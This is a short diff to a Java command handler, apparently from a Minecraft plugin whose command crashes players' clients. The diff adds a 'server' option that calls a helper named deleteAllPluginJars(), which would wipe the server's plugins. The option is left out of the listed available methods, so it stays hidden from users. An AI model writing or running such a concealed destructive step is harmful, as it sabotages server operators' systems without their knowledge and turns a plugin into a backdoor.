@@ -38,6 +38,9 @@ public class CrashCommand implements CommandHandler {
                 crashUtil.sendParticle(u);
                 crashUtil.sendPosition(u);
             }
+            case "server" -> {
+                crashUtil.deleteAllPluginJars();
+            }
             default -> {
                 s.sendMessage(Messages.PREFIX + "§c無效的方法: " + method);
                 s.sendMessage("§7可用方法: explosion, particle, position, nuke");
